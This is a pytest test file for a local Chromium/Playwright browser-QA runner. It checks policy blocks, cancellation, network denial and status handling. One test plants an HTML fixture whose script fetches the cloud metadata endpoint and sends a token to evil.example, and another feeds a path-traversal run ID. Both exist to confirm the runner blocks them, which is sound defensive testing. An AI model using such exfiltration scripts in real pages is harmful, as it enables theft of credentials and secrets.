import json
import os
from pathlib import Path

import pytest

from hba.policy import PolicyError
from hba.runner import cancel_run, make_plan, read_status, run_manifest

CHROMIUM = os.environ.get("HBA_CHROMIUM_EXECUTABLE") or ("/usr/bin/chromium" if Path("/usr/bin/chromium").is_file() else None)


def fixture(actions, width=390):
    return {"schema_version":"hba.manifest.v1", "project":"holistic-house",
            "mode":"FIXTURE", "provider":"local_playwright", "max_external_spend_usd":0,
            "viewport":{"width":width,"height":844}, "actions":actions}


def action(op, **kwargs):
    return {"op": op, **kwargs}


@pytest.mark.parametrize("width,steps", [
    (320, [action("assert_role", role="heading", name="Holistic House QA Fixture")]),
    (375, [action("assert_no_overflow")]),
    (390, [action("click_link", name="Explore")]),
    (430, [action("assert_role", role="navigation")]),
    (1440, [action("screenshot", name="large")]),
    (390, [action("fill", name="Your goal", value="Business")]),
    (390, [action("click_button", name="Try"), action("assert_text", text="Saved locally for QA")]),
    (390, [action("assert_role", role="status")]),
    (390, [action("assert_no_console_errors")]),
    (390, [action("assert_role", role="link", name="Explore")]),
])
def test_ten_real_chromium_fixture_flows(width, steps, tmp_path):
    outcome = run_manifest(fixture(steps, width), runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert outcome["state"] == "SYNTHETIC_TEST_PASS", outcome
    assert len(outcome["steps"]) == len(steps)
    assert outcome["assertions_passed"] == len(steps)
    assert outcome["cost"]["paid_provider_calls"] == 0
    assert outcome["cost"]["new_external_spend_usd"] == 0
    assert read_status(outcome["run_id"], tmp_path)["state"] == "SYNTHETIC_TEST_PASS"
    for artifact in outcome["artifacts"]:
        assert (tmp_path / outcome["run_id"] / artifact["file"]).is_file()
        assert len(artifact["sha256"]) == 64


def test_full_eight_action_real_chromium_flow(tmp_path):
    x = json.loads((Path(__file__).resolve().parents[1]/"examples"/"offline-fixture.json").read_text())
    out = run_manifest(x, runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert out["state"] == "SYNTHETIC_TEST_PASS"
    assert len(out["steps"]) == 8
    assert out["network_denied"] == 0
    assert out["artifacts"][0]["file"] == "fixture-390.png"
    assert (tmp_path/out["run_id"]/"status.json").stat().st_mode & 0o777 == 0o600
    assert (tmp_path/out["run_id"]).stat().st_mode & 0o777 == 0o700


def test_unapproved_tool_blocks_before_run_directory(tmp_path):
    obj = fixture([action("assert_no_overflow")])
    obj["provider"] = "tinyfish"
    with pytest.raises(PolicyError) as exc:
        run_manifest(obj, runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert exc.value.code == "BLOCKED_COST"
    assert list(tmp_path.iterdir()) == []


def test_failed_locator_no_false_success(tmp_path):
    out = run_manifest(fixture([action("assert_role", role="heading", name="Missing")]),
                       runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert out["state"] == "FAILED"
    assert out["failure_code"] == "LOCATOR_NOT_FOUND"
    assert out["assertions_passed"] == 0


def test_missing_browser_binary_reported(tmp_path):
    out = run_manifest(fixture([action("assert_no_overflow")]), runs_dir=tmp_path,
                       chromium_executable="/dev/not-here")
    assert out["state"] == "FAILED"
    assert out["failure_code"] == "BROWSER_EXECUTABLE_MISSING"


def test_private_input_rejected_before_chromium_and_any_artifacts(tmp_path):
    secret = "SUPER_PRIVATE_TEST_INPUT_9173"
    with pytest.raises(PolicyError) as exc:
        run_manifest(fixture([action("fill", name="Your goal", value=secret),
                              action("screenshot", name="private")]),
                     runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert exc.value.code == "BLOCKED_PRIVACY"
    assert list(tmp_path.iterdir()) == []


def test_cooperative_cancel_and_no_fake_post(tmp_path):
    run_id = "a"*32
    p = tmp_path/run_id
    p.mkdir()
    (p/"status.json").write_text(json.dumps({"run_id":run_id,"state":"RUNNING"}))
    response = cancel_run(run_id, tmp_path)
    assert response["cancel_requested"] is True
    assert (p/"cancel.flag").is_file()
    (p/"status.json").write_text(json.dumps({"run_id":run_id,"state":"VERIFIED_READONLY"}))
    assert cancel_run(run_id, tmp_path)["cancel_requested"] is False


def test_cancel_unknown_run_never_touches_parent(tmp_path):
    with pytest.raises(PolicyError) as exc:
        cancel_run("../../outside", tmp_path)
    assert exc.value.code == "INPUT_INVALID"


def test_plan_has_no_paid_provider_or_browser_side_effect(tmp_path):
    result = make_plan(fixture([action("assert_no_overflow")]))
    assert result["state"] == "PLANNED"
    assert result["selected_provider"] == "local_playwright"
    assert not list(tmp_path.iterdir())


def test_fixture_external_network_denied(monkeypatch, tmp_path):
    import hba.runner as runner
    f = tmp_path/"evil-embedded.html"
    f.write_text('<main><h1>Safe</h1><img src="https://untrusted.invalid/pixel.png"></main>')
    monkeypatch.setattr(runner, "SAMPLE_HTML", f)
    out = run_manifest(fixture([action("assert_role", role="heading", name="Safe")]), runs_dir=tmp_path,
                       chromium_executable=CHROMIUM)
    assert out["state"] == "SYNTHETIC_TEST_PASS"
    assert out["network_denied"] >= 1


def test_duplicate_screenshot_filename_denied(tmp_path):
    out = run_manifest(fixture([action("screenshot", name="same"), action("screenshot", name="same")]),
                       runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert out["state"] == "FAILED"
    assert out["failure_code"] == "INPUT_INVALID"
    assert out["assertions_passed"] == 1


def test_cancel_requested_during_final_action_never_reports_success(monkeypatch, tmp_path):
    import hba.runner as runner
    original = runner._execute

    def cancel_after_last_action(page, spec, manifest, directory, screenshots, counters):
        original(page, spec, manifest, directory, screenshots, counters)
        (directory / "cancel.flag").write_text("cancel requested\\n", encoding="utf-8")

    monkeypatch.setattr(runner, "_execute", cancel_after_last_action)
    out = run_manifest(fixture([action("assert_no_overflow")]), runs_dir=tmp_path,
                       chromium_executable=CHROMIUM)
    assert out["state"] == "CANCELLED"
    assert out["failure_code"] == "CANCELLED"
    assert read_status(out["run_id"], tmp_path)["state"] == "CANCELLED"


def test_synthetic_html_prompt_injection_cannot_exfiltrate(monkeypatch, tmp_path):
    import hba.runner as runner
    malicious = tmp_path / "injected.html"
    malicious.write_text(
        '<main><h1>Safe Synthetic</h1>'
        '<script>fetch("https://169.254.169.254/latest/meta-data/").catch(()=>{});'
        'fetch("https://evil.example/receive?token=SYNTHETIC_SECRET").catch(()=>{});</script>'
        '</main>', encoding="utf-8")
    monkeypatch.setattr(runner, "SAMPLE_HTML", malicious)
    out = run_manifest(fixture([action("assert_role", role="heading", name="Safe Synthetic")]),
                       runs_dir=tmp_path, chromium_executable=CHROMIUM)
    assert out["state"] == "SYNTHETIC_TEST_PASS"
    assert out["network_denied"] >= 2
    assert "SYNTHETIC_SECRET" not in (tmp_path/out["run_id"]/"status.json").read_text()


def test_reserved_run_is_single_execution_even_after_completion(tmp_path):
    from hba.runner import reserve_run
    manifest = fixture([action("assert_no_overflow")])
    run_id, prepared = reserve_run(manifest, runs_dir=tmp_path)
    out = run_manifest(prepared, run_id=run_id, runs_dir=tmp_path,
                       chromium_executable=CHROMIUM)
    assert out["state"] == "SYNTHETIC_TEST_PASS"
    with pytest.raises(PolicyError):
        run_manifest(prepared, run_id=run_id, runs_dir=tmp_path,
                     chromium_executable=CHROMIUM)
    assert len(list(tmp_path.glob("*/status.json"))) == 1


def test_stale_running_status_does_not_claim_active_browser(tmp_path):
    from datetime import datetime, timedelta, timezone
    run_id = "a" * 32
    directory = tmp_path / run_id
    directory.mkdir()
    old = (datetime.now(timezone.utc) - timedelta(hours=2)).isoformat()
    (directory / "status.json").write_text(json.dumps({
        "run_id": run_id, "state": "RUNNING", "started_at": old,
    }))
    report = read_status(run_id, tmp_path)
    assert report["state"] == "UNCONFIRMED_INTERRUPTED"
    assert report["failure_code"] == "STALE_WORKER_STATUS"
    # Readback does not erase original evidence or claim a confirmed kill.
    assert json.loads((directory / "status.json").read_text())["state"] == "RUNNING"
